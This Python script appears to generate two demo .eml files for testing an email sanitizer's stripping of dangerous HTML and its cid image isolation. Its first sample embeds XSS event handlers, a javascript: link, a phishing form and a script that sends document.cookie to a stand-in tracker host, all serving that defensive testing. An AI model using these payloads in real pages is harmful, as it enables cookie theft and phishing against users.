"""生成两个无害的测试样例 .eml（运行：python3 tools/generate_samples.py）。

样例均为人工构造的无害内容，用于演示隔离效果：

* sample1-malicious-tags.eml —— 内嵌 PNG/JPEG（cid 引用）+ 外部跟踪像素 +
  脚本/事件属性/样式/表单/iframe/meta 跳转等恶意标签 + 钓鱼链接；
* sample2-cid-collision.eml —— 与样例 1 使用相同 Content-ID，但图片内容不同，
  用于验证两封邮件的 cid 图片不会串用；同时包含损坏的 PNG（解码失败）与缺失 cid，
  二者均应回退为占位图。
"""

from __future__ import annotations

import io
from email.message import EmailMessage
from email.utils import formatdate, make_msgid
from pathlib import Path

from PIL import Image, ImageDraw

OUT_DIR = Path(__file__).resolve().parents[1] / "app" / "static" / "samples"


def png_png(color: tuple[int, int, int], label: str, size=(160, 90)) -> bytes:
    img = Image.new("RGB", size, color)
    draw = ImageDraw.Draw(img)
    draw.rectangle([2, 2, size[0] - 3, size[1] - 3], outline=(255, 255, 255), width=2)
    draw.text((10, 34), label, fill=(255, 255, 255))
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


def jpeg_bytes(color: tuple[int, int, int], label: str, size=(160, 90)) -> bytes:
    img = Image.new("RGB", size, color)
    draw = ImageDraw.Draw(img)
    draw.text((10, 34), label, fill=(255, 255, 255))
    buf = io.BytesIO()
    img.save(buf, format="JPEG", quality=85)
    return buf.getvalue()


def png_bytes_corrupt() -> bytes:
    """合法 MIME 部件（声明 image/png）但内容无法被图片解码器识别。"""
    return b"\x89PNG\r\n\x1a\n" + b"\x00" * 64 + b"corrupt-image-data"


def related_message(subject: str, html: str, images: list[tuple[str, str, bytes]]) -> bytes:
    """images: [(cid 不带尖括号, mime, payload), ...]"""
    msg = EmailMessage()
    msg["Subject"] = subject
    msg["From"] = "security-demo@example.test"
    msg["To"] = "analyst@example.test"
    msg["Date"] = formatdate(localtime=True)
    msg["Message-ID"] = make_msgid(domain="example.test")

    html_part = EmailMessage()
    html_part.set_content(html, subtype="html", charset="utf-8")

    msg.make_related()
    msg.attach(html_part)
    for cid, mime, payload in images:
        maintype, subtype = mime.split("/", 1)
        image_part = EmailMessage()
        image_part.set_content(
            payload, maintype=maintype, subtype=subtype,
            disposition="inline",
        )
        image_part.add_header("Content-ID", f"<{cid}>")
        msg.attach(image_part)
    return msg.as_bytes()


SAMPLE1_HTML = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8" />
<title>账户异常通知（演示）</title>
<!-- 恶意：meta 跳转，应被整体移除 -->
<meta http-equiv="refresh" content="0;url=https://evil.example.test/phish" />
<style>
  body { font-family: sans-serif; }        /* 恶意：样式标签应被移除 */
  .danger { color: red; }
</style>
<script>
  // 恶意：脚本必须被剥离且绝不执行
  fetch("https://tracker.example.test/beacon?stole=" + document.cookie);
</script>
</head>
<body onload="alert('xss-onload')">
<h1>账户安全提醒（演示样例，内容无害）</h1>
<p>尊敬的用户，我们检测到您的账户出现 <strong>异常登录</strong>，
请尽快核实。本邮件包含以下测试元素：</p>

<h2>一、正常排版元素</h2>
<ul>
  <li><strong>加粗强调</strong> 与 <em>斜体强调</em> 应保留</li>
  <li>段落、标题、列表结构应完整保留</li>
</ul>
<blockquote>引用块：这是一段被引用的说明文字。</blockquote>

<h2>二、内嵌图片（cid 引用，应正常渲染）</h2>
<p>
  <img src="cid:logo@example.test" alt="公司标识（内嵌 PNG）" width="160" />
  <img src="cid:seal@example.test" alt="安全印章（内嵌 JPEG）" width="160" />
</p>

<h2>三、外部跟踪图片（应替换为占位图，不发起任何请求）</h2>
<p><img src="https://tracker.example.net/pixel.gif?campaign=phish-001"
        alt="远程跟踪像素" width="1" height="1" /></p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+M8AAAMBAQDJ/pLvAAAAAElFTkSuQmCC"
        alt="data URI 图片" /></p>
<p><img src="cid:does-not-exist@example.test" alt="引用了不存在的 cid" /></p>

<h2>四、钓鱼链接（只展示文字和原地址，不可点击跳转）</h2>
<p>请 <a href="https://login.example.org/verify?token=abc123">点击此处验证账户</a>，
或访问 <a href="https://evil.example.test/steal">伪装成官方的链接</a>。
javascript 伪协议链接 <a href="javascript:alert(1)">点我</a> 不应展示为链接。</p>

<h2>五、表单与嵌套文档（应整体移除，文字不丢失）</h2>
<form action="https://evil.example.test/collect" method="post">
  <label>密码：<input type="password" name="pwd" /></label>
  <button type="submit">提交（表单应被移除）</button>
</form>
<iframe src="https://evil.example.test/frame" width="300" height="80"></iframe>
<object data="https://evil.example.test/obj"></object>

<h2>六、事件属性与内联样式（应被剥离）</h2>
<p onmouseover="alert('xss-hover')" style="color:red;background:url(https://evil.example.test/x)">
  鼠标移上来试试（事件与样式均应失效）。
</p>
<img src="cid:logo@example.test" onerror="alert('xss-img')"
     style="border: 10px solid" alt="重复 cid 引用同一张图" />

<h2>七、表格（结构应保留）</h2>
<table>
  <thead><tr><th>时间</th><th>事件</th><th>地点</th></tr></thead>
  <tbody>
    <tr><td>2026-11-11 09:00</td><td>异地登录</td><td>测试地区 A</td></tr>
    <tr><td>2026-11-11 09:05</td><td>密码修改尝试</td><td>测试地区 B</td></tr>
  </tbody>
</table>

<noscript><img src="https://tracker.example.net/noscript.gif" /></noscript>
</body>
</html>
"""

SAMPLE2_HTML = """<!DOCTYPE html>
<html lang="zh-CN">
<head><meta charset="utf-8" /><title>账单通知（演示）</title></head>
<body>
<h1>月度账单（演示样例 2，cid 与样例 1 相同）</h1>
<p>本邮件与样例 1 使用<b>相同的 Content-ID</b>，但图片内容不同；
连续预览两封邮件时图片不得串用。</p>

<h2>同 cid 的不同图片（应显示本邮件自己的图片）</h2>
<p><img src="cid:logo@example.test" alt="样例2 的 logo" width="160" /></p>

<h2>无法解码的图片（合法 PNG 部件但字节损坏，应显示占位图）</h2>
<p><img src="cid:animated@example.test" alt="损坏的内嵌图" /></p>

<h2>缺失 cid（应显示占位图）</h2>
<p><img src="cid:missing@example.test" alt="不存在的引用" /></p>

<h2>正常文字内容</h2>
<ol>
  <li>第一条有序列表</li>
  <li>第二条有序列表</li>
</ol>
<p>账单明细链接：<a href="https://billing.example.test/invoice/2026-11">查看账单</a></p>
</body>
</html>
"""


def main() -> None:
    OUT_DIR.mkdir(parents=True, exist_ok=True)

    sample1 = related_message(
        "[演示] 账户安全提醒（含内嵌图片/外部跟踪/恶意标签）",
        SAMPLE1_HTML,
        [
            ("logo@example.test", "image/png",
             png_png((30, 64, 175), "SAMPLE1-LOGO-PNG")),
            ("seal@example.test", "image/jpeg",
             jpeg_bytes((175, 48, 48), "SAMPLE1-SEAL-JPEG")),
        ],
    )
    sample2 = related_message(
        "[演示] 月度账单（同 cid 不同图片，验证隔离）",
        SAMPLE2_HTML,
        [
            # 与样例 1 完全相同的 cid，但颜色/文字不同
            ("logo@example.test", "image/png",
             png_png((16, 122, 87), "SAMPLE2-LOGO-PNG")),
            # 声明 image/png 但字节损坏：通过结构校验，重编码失败后回退占位图
            ("animated@example.test", "image/png",
             png_bytes_corrupt()),
        ],
    )

    (OUT_DIR / "sample1-malicious-tags.eml").write_bytes(sample1)
    (OUT_DIR / "sample2-cid-collision.eml").write_bytes(sample2)
    for path in sorted(OUT_DIR.glob("*.eml")):
        print(f"wrote {path} ({path.stat().st_size} bytes)")


if __name__ == "__main__":
    main()
